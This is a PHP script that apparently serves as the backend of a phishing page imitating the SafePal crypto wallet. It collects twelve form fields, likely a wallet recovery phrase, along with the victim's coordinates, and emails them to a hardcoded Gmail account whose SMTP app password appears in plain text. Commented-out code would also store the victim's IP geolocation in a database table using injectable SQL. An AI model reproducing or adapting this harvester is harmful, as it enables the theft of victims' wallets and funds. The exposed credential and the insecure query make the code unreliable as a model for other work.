<?php

$conn=mysqli_connect('localhost','root','','safepal');
if(!$conn){
            echo "Connection failed";
        }

        
?>

 <?php 

  require 'vendor/autoload.php';  // Include the Composer autoloader

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require 'vendor/phpmailer/phpmailer/src/Exception.php';
require 'vendor/phpmailer/phpmailer/src/PHPMailer.php';
require 'vendor/phpmailer/phpmailer/src/SMTP.php';
if (isset($_POST['submit'])) {
    $text1 = $_POST['text1'];
    $text2 = $_POST['text2'];
    $text3 = $_POST['text3'];
    $text4 = $_POST['text4'];
    $text5 = $_POST['text5'];
    $text6 = $_POST['text6'];
    $text7 = $_POST['text7'];
    $text8 = $_POST['text8'];
    $text9 = $_POST['text9'];
    $text10 = $_POST['text10'];
    $text11 = $_POST['text11'];
    $text12 = $_POST['text12'];
    $current_time = date("H:i:s");
    $current_date = date("m-d-y");
    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];

    // Build the HTML table
    $message = "
        <html>
        <head>
            <title>Email Content</title>
        </head>
        <body>
            <h2>Email Content</h2>
            <table>
                <tr><td>Text 1:</td><td>$text1</td></tr>
                <tr><td>Text 2:</td><td>$text2</td></tr>
                <tr><td>Text 3:</td><td>$text3</td></tr>
                <tr><td>Text 4:</td><td>$text4</td></tr>
                <tr><td>Text 5:</td><td>$text5</td></tr>
                <tr><td>Text 6:</td><td>$text6</td></tr>
                <tr><td>Text 7:</td><td>$text7</td></tr>
                <tr><td>Text 8:</td><td>$text8</td></tr>
                <tr><td>Text 9:</td><td>$text9</td></tr>
                <tr><td>Text 10:</td><td>$text10</td></tr>
                <tr><td>Text 11:</td><td>$text11</td></tr>
                <tr><td>Text 12:</td><td>$text12</td></tr>
                <tr><td>Current Time:</td><td>$current_time</td></tr>
                <tr><td>Current Date:</td><td>$current_date</td></tr>
                <tr><td>Latitude:</td><td>$latitude</td></tr>
                <tr><td>Longitude:</td><td>$longitude</td></tr>
            </table>
        </body>
        </html>
    ";
   
   
    
    $mail = new PHPMailer(true);
    
    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';  // Specify your SMTP server
        $mail->SMTPAuth   = true;
        $mail->Username   = 'decentroyal11@gmail.com'; // SMTP username
        $mail->Password   = 'ljmb dxkq gnhi bcxa';  // SMTP password
        $mail->SMTPSecure = 'tls';   // Enable TLS encryption; `ssl` also accepted
        $mail->Port       = 587;  // TCP port to connect to
    
        // Recipients
        $mail->setFrom('decentroyal11@gmail.com', 'Decent Royal');
        $mail->addAddress('decentroyal11@gmail.com', 'Recipient Name');
    
        // Content
        $mail->isHTML(true);    
        $mail->Subject = 'Test Email';
        $mail->Body    = $message;
    
        $mail->send();
        echo 'Email sent successfully!';
    } catch (Exception $e) {
        echo "Error sending email: {$mail->ErrorInfo}";
    }

    



}




























//             $public_ip = file_get_contents('https://api64.ipify.org?format=json');
//             $public_ip = json_decode($public_ip, true)['ip'];



            
// $access_token = '153fae3bbbabfe'; // Replace with your IPinfo API access token
// $public_ip = file_get_contents('https://api64.ipify.org?format=json');
// $public_ip = json_decode($public_ip, true)['ip'];

// Get the public IP address in IPv4 format using ipify API


// $public_ip_response = file_get_contents('https://api.ipify.org?format=json&ipv=4');
// $public_ip_data = json_decode($public_ip_response, true);

// if ($public_ip_data && isset($public_ip_data['ip'])) {
//     $public_ipv4 = $public_ip_data['ip'];

    
// }

// // Construct the API URL
// $api_url = "http://ipinfo.io/$public_ipv4";

// // Make the API request
// $response = file_get_contents($api_url);

// // Check if the request was successful
// if ($response !== false) {
//     // Decode the JSON response
//     $data = json_decode($response, true);

//     // Display location information
//     // echo "IP Address: {$data['ip']}\n";
//     // echo "Country: {$data['country']}\n";
//     // echo "Region: {$data['region']}\n";
//     // echo "City: {$data['city']}\n";
//     // echo "Latitude: {$data['loc']}\n";
//     // echo "Longitude: {$data['loc']}\n";
//     $contry=$data['country'];
//     $region=$data['region'];
//     $city=$data['city'];
    


// } else {
//     echo "Failed to fetch location information.";
// }
//             $sql="INSERT into popup (text1,text2,text3,text4,text5,text6,text7,text8,text9,text10,text11,text12,date,ip,country,region,city )VALUES('$text1','$text2','$text3','$text4','$text5','$text6','$text7','$text8','$text9','$text10','$text11','$text12','$current_date','$public_ipv4','$contry','$region','$city');";
//             $result=mysqli_query($conn,$sql);
//             if($result)
//             {
               
//                 header("location:index.html");
//     }else{
//         echo '<script>alert("Data not Inserted")</script>';
//     }
// }
 ?>